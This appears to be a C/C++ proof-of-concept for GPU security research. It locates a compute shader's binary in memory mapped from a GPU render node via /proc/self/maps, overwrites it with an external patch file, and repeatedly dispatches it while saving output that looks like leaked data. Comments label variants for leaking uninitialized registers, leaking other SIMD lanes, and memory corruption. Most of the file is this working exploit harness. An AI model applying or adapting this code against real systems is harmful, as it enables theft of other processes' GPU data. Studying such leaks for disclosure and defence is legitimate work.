// GLES
#include <GL/gl.h>
#include <GL/glext.h>
#include <GLES3/gl3.h>
#include <GLES3/gl32.h>

// EGL
#include <EGL/egl.h>

#include <SDL2/SDL_image.h>

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <string.h>

#define NUM_GROUPS      64
#define LOCAL_SIZE      256      // Also change in compute2.glsl

#define CHECK() \
{\
    GLenum err = glGetError(); \
    if (err != GL_NO_ERROR) \
    {\
        printf("glGetError returns %d\n", err); \
    }\
}

uint8_t* pixels = NULL;
size_t pixels_w, pixels_h;

void hexDump(const void* data, size_t size, FILE* out_f) {
    int fd = memfd_create("log_tmp", 0);
    FILE *f = fdopen(fd, "r+");

    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    unsigned int addr = 0;
    for (i = 0; i < size; ++i) {
        if (i % 0x10 == 0) {
            fprintf(f, "%04X: ", addr);
            addr += 0x10;
        }

        fprintf(f, "%02X ", ((unsigned char*)data)[i]);

        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            fprintf(f, " ");
            if ((i+1) % 16 == 0) {
                fprintf(f, "|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    fprintf(f, " ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    fprintf(f, "   ");
                }
                fprintf(f, "|  %s \n", ascii);
            }
        }
    }

    fseek(f, 0, SEEK_SET);
    fseek(f, 0L, SEEK_END);
    size_t sz = ftell(f);
    fseek(f, 0, SEEK_SET);

    void* buf = malloc(sz + 1);

    fread(buf, sz, 1, f);
    ((char*)buf)[sz] = 0;

    printf("%s\n", (char*)buf);

    if (out_f != NULL) {
        fwrite(data, size, 1, out_f);
    }

    free(buf);

    fclose(f);
}

void hexDumpFloat(const void* data, size_t size, FILE* out_f) {
    int fd = memfd_create("log_tmp", 0);
    FILE *f = fdopen(fd, "r+");

    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    unsigned int addr = 0;
    for (i = 0; i < size; ++i) {
        if (i % 0x10 == 0) {
            fprintf(f, "%04X: ", addr);
            addr += 0x10;
        }

        fprintf(f, "%02X ", ((unsigned char*)data)[i]);

        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            fprintf(f, " ");
            if ((i+1) % 16 == 0) {
                fprintf(f, "|  %s ", ascii);

                // Print values as floats
                float* fl = (float*)((uint8_t*)data + i - 0xF);
                fprintf(f, " %f %f %f %f\n", fl[0], fl[1], fl[2], fl[3]);

            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    fprintf(f, " ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    fprintf(f, "   ");
                }
                fprintf(f, "|  %s ", ascii);

                // Print values as floats
                float* fl = (float*)((uint8_t*)data + i - 0x10);
                fprintf(f, " %f %f %f %f\n", fl[0], fl[1], fl[2], fl[3]);
            }
        }
    }

    fseek(f, 0, SEEK_SET);
    fseek(f, 0L, SEEK_END);
    size_t sz = ftell(f);
    fseek(f, 0, SEEK_SET);

    void* buf = malloc(sz + 1);

    fread(buf, sz, 1, f);
    ((char*)buf)[sz] = 0;

    printf("%s\n", (char*)buf);

    if (out_f != NULL) {
        fwrite(data, size, 1, out_f);
    }

    free(buf);

    fclose(f);
}

GLuint loadShader(GLenum shaderType, const char* pSource) {
    GLuint shader = glCreateShader(shaderType);
    if (shader) {
        glShaderSource(shader, 1, &pSource, NULL);
        glCompileShader(shader);
        GLint compiled = 0;
        glGetShaderiv(shader, GL_COMPILE_STATUS, &compiled);
        if (!compiled) {
            GLint infoLen = 0;
            glGetShaderiv(shader, GL_INFO_LOG_LENGTH, &infoLen);
            if (infoLen) {
                char* buf = (char*) malloc(infoLen);
                if (buf) {
                    glGetShaderInfoLog(shader, infoLen, NULL, buf);
                    printf("Could not compile shader %d:\n%s\n", shaderType, buf);
                    free(buf);
                }
                glDeleteShader(shader);
                shader = 0;
            }
        }
    }
    return shader;
}

GLuint createComputeProgram(const char* pComputeSource) {
    GLuint computeShader = loadShader(GL_COMPUTE_SHADER, pComputeSource);
    if (!computeShader) {
        return 0;
    }

    GLuint program = glCreateProgram();
    if (program) {
        glAttachShader(program, computeShader);
        glLinkProgram(program);
        GLint linkStatus = GL_FALSE;
        glGetProgramiv(program, GL_LINK_STATUS, &linkStatus);
        if (linkStatus != GL_TRUE) {
            GLint bufLength = 0;
            glGetProgramiv(program, GL_INFO_LOG_LENGTH, &bufLength);
            if (bufLength) {
                char* buf = (char*) malloc(bufLength);
                if (buf) {
                    glGetProgramInfoLog(program, bufLength, NULL, buf);
                    printf("Could not link program:\n%s\n", buf);
                    free(buf);
                }
            }
            glDeleteProgram(program);
            program = 0;
        }
    }
    return program;
}

void setupSSBufferObject(GLuint& ssbo, GLuint index, unsigned int* pIn, GLuint count) {
    glGenBuffers(1, &ssbo);
    glBindBuffer(GL_SHADER_STORAGE_BUFFER, ssbo);

    glBufferData(GL_SHADER_STORAGE_BUFFER, count * sizeof(unsigned int), pIn, GL_STATIC_DRAW);
    glBindBufferBase(GL_SHADER_STORAGE_BUFFER, index, ssbo);
}

char* readFile(char* path, size_t* size) {
    FILE *f = fopen(path, "rb");
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);  /* same as rewind(f); */

    char *string = (char*) malloc(fsize + 1);
    fread(string, fsize, 1, f);
    fclose(f);

    string[fsize] = 0;

    *size = fsize;

    return string;
}

void patch() {
    unsigned int ctr = 0;

    FILE *fp = fopen("/proc/self/maps", "r");
    if (!fp) {
        perror("Error opening file");
    }

    printf("Patching shader binary code\n");

    char line[1024];
    while (fgets(line, sizeof(line), fp)) {
        unsigned long start, end, offset;
        char perms[5], dev[12], name[1024];
        int ret = sscanf(line, "%lx-%lx %4s %x %37s %*s %1023[^\n]",
                         &start, &end, perms, &offset, dev, name);
        if (ret == 5) {
            name[0] = '\0';
        }

        printf("%lx-%lx | %s | %lx | %s\n", start, end, perms, offset, name);

        if (strcmp(name, "/dev/dri/renderD128") == 0 && *(uint32_t*)start != 0) {
            size_t shader_size = 0;

            uint32_t* ptr = (uint32_t*)start;

            while(*ptr != 0x0) ptr++;

            shader_size = (unsigned long)ptr - (unsigned long)start;

            // Dump original shader
            hexDump((void *) start, shader_size, NULL);

            FILE *f2 = fopen("compute2_orig_shader.bin", "w+");
            fwrite((void*)start, shader_size, 1, f2);
            fclose(f2);

            // Load shader patch
            FILE *f = fopen("patch3.bin", "rb");
            fseek(f, 0, SEEK_END);
            long fsize = ftell(f);
            fseek(f, 0, SEEK_SET);
            void *shader_patch = malloc(fsize + 1);
            fread(shader_patch, fsize, 1, f);
            fclose(f);
            memset((void*)start, 0, shader_size);
            memcpy((void*)start, shader_patch, fsize);

            // Leak uninitialized


            // Leak other SIMD
            //*(uint32_t*)(start + 0x26) = 0xc642050e; //iadd             r1, r1.sx, r6.sx

            // Corruption
            //*(uint32_t*)(start + 0x26) = 0xc642690e; //iadd             r91, r1.sx, r6.sx
            //*(uint32_t*)(start + 0x2A) = 0x64200000;
        }
    }
}

void dumpArray(void* data, size_t size) {
    FILE* f = fopen("out.bin", "a+");
    fwrite(data, size, 1, f);
    fclose(f);
}

int checkIfAllValue(uint32_t* ptr, size_t s, uint32_t value) {
    int b = 1;
    
    for (uint32_t* p = ptr; p < ptr + s; p++) {
        if (*p != value) {
            b = 0;
            break;
        }
    }

    return b;
}

void computeShader()
{
    GLuint computeProgram;
    GLuint input0SSbo;
    GLuint input1SSbo;
    GLuint output0SSbo;
    GLuint output1SSbo;
    GLuint output2SSbo;

    CHECK();
    size_t compute_file_size;
    computeProgram = createComputeProgram(readFile("compute.glsl", &compute_file_size));
    CHECK();

    const GLuint arraySize = NUM_GROUPS * LOCAL_SIZE;
    unsigned int f0[arraySize];
    unsigned int f1[arraySize];
    for (GLuint i = 0; i < arraySize; ++i)
    {
        f0[i] = 0;
        f1[i] = 0;
    }
    setupSSBufferObject(input0SSbo,  0, f0, arraySize);
    setupSSBufferObject(input1SSbo,  1, f1, arraySize);
    setupSSBufferObject(output0SSbo, 2, NULL, arraySize);
    setupSSBufferObject(output1SSbo, 3, NULL, arraySize);
    setupSSBufferObject(output2SSbo, 4, NULL, arraySize);
    CHECK();

    glUseProgram(computeProgram);

    patch();

    unsigned int old_pOut[arraySize];

    //printf("Trying to leak register %d\n", current_reg);
    for (unsigned int k = 0; k < 1000000; k++) {

        glDispatchCompute(NUM_GROUPS, 1, 1);   // arraySize/local_size_x
        glMemoryBarrier(GL_SHADER_STORAGE_BARRIER_BIT);
        CHECK();

        unsigned int *pOut0_ = NULL;
        unsigned int *pOut1_ = NULL;
        unsigned int *pOut2_ = NULL;

        glBindBuffer(GL_SHADER_STORAGE_BUFFER, output0SSbo);
        unsigned int *pOut0 = (unsigned int *) glMapBufferRange(GL_SHADER_STORAGE_BUFFER, 0,
                                                               arraySize * sizeof(unsigned int),
                                                               GL_MAP_READ_BIT);
        pOut0_ = (unsigned int*)malloc(arraySize * sizeof(unsigned int));
        memcpy(pOut0_, pOut0, arraySize * sizeof(unsigned int));
        glUnmapBuffer(GL_SHADER_STORAGE_BUFFER);

        /*glBindBuffer(GL_SHADER_STORAGE_BUFFER, output1SSbo);
        unsigned int *pOut1 = (unsigned int *) glMapBufferRange(GL_SHADER_STORAGE_BUFFER, 0,
                                                               arraySize * sizeof(unsigned int),
                                                               GL_MAP_READ_BIT);
        pOut1_ = (unsigned int*)malloc(arraySize * sizeof(unsigned int));
        memcpy(pOut1_, pOut1, arraySize * sizeof(unsigned int));
        glUnmapBuffer(GL_SHADER_STORAGE_BUFFER);

        glBindBuffer(GL_SHADER_STORAGE_BUFFER, output2SSbo);
        unsigned int *pOut2 = (unsigned int *) glMapBufferRange(GL_SHADER_STORAGE_BUFFER, 0,
                                                               arraySize * sizeof(unsigned int),
                                                               GL_MAP_READ_BIT);
        pOut2_ = (unsigned int*)malloc(arraySize * sizeof(unsigned int));
        memcpy(pOut2_, pOut2, arraySize * sizeof(unsigned int));
        glUnmapBuffer(GL_SHADER_STORAGE_BUFFER);*/

        //hexDump((void *) pOut0_, arraySize * sizeof(unsigned int), NULL);

        int seen_magic = 0;

        for (unsigned int i = 0; i < arraySize; i++) {
            continue;

            uint32_t p0 = pOut0_ != NULL ? pOut0_[i] : 0;
            uint32_t p1 = pOut1_ != NULL ? pOut1_[i] : 0;
            uint32_t p2 = pOut2_ != NULL ? pOut2_[i] : 0;

            if (p0 == 0x3f0e353f || p0 == 0x3f8ccccd || p0 == 0x3dfd566d) {
                //printf("Sandwiched: 0x%x\n", p1);
                printf("Seen magic value 0x%x @ 0x%lx\n", p0, i);
                seen_magic = 1;
            }
        }
        
        unsigned int zero_chunk_ctr = 0;

        for (uint32_t* p = pOut0_; p < pOut0_ + arraySize; p+=32) {
            if (checkIfAllValue(p, 32, 0)) zero_chunk_ctr++;
        }

        //if (seen_magic) {
        if (zero_chunk_ctr >= 40 && zero_chunk_ctr <= 42) {
            //hexDumpFloat((void *) pOut0_, arraySize * sizeof(unsigned int), NULL);

            FILE *f = fopen("out.bin", "a+");
            fwrite((void*)pOut0_, arraySize * sizeof(unsigned int), 1, f);
            fclose(f);

            //exit(0);
        }


        if (pOut0_) free(pOut0_);
        if (pOut1_) free(pOut1_);
        if (pOut2_) free(pOut2_);
    }

    //current_reg++;

    printf("verification PASSED\n");
    glDeleteProgram(computeProgram);
}

int main() {
    SDL_Surface * texture = IMG_Load("../test.png");
    if( texture == NULL )
    {
        printf( "Unable to load image %s! SDL_image Error: %s\n", "test.png", IMG_GetError() );
    }
    pixels = (uint8_t*)texture->pixels;
    pixels_w = texture->w;
    pixels_h = texture->h;

    printf("BytesPerPixel: %d\n", texture->format->BytesPerPixel);

    EGLDisplay dpy = eglGetDisplay(EGL_DEFAULT_DISPLAY);
    if (dpy == EGL_NO_DISPLAY) {
        printf("eglGetDisplay returned EGL_NO_DISPLAY.\n");
        return -1;
    }

    EGLint majorVersion;
    EGLint minorVersion;
    EGLBoolean returnValue = eglInitialize(dpy, &majorVersion, &minorVersion);
    if (returnValue != EGL_TRUE) {
        printf("eglInitialize failed\n");
        return -1;
    }

    EGLConfig cfg;
    EGLint count;
    EGLint egl_config_attr[] = {
        EGL_BUFFER_SIZE,    16,
        EGL_DEPTH_SIZE,     16,
        EGL_STENCIL_SIZE,   0,
        EGL_SURFACE_TYPE,
        EGL_WINDOW_BIT,
        EGL_NONE
    };

    if (eglChooseConfig(dpy, egl_config_attr, &cfg, 1, &count) == EGL_FALSE) {
        printf("eglChooseConfig failed\n");
        return -1;
    }

    EGLint context_attribs[] = { EGL_CONTEXT_CLIENT_VERSION, 3, EGL_NONE };
    EGLContext context = eglCreateContext(dpy, cfg, EGL_NO_CONTEXT, context_attribs);

    returnValue = eglMakeCurrent(dpy, EGL_NO_SURFACE, EGL_NO_SURFACE, context);
    if (returnValue != EGL_TRUE) {
        printf("eglMakeCurrent failed returned %d\n", returnValue);
        return -1;
    }

    computeShader();

    eglDestroyContext(dpy, context);

    return 0;
}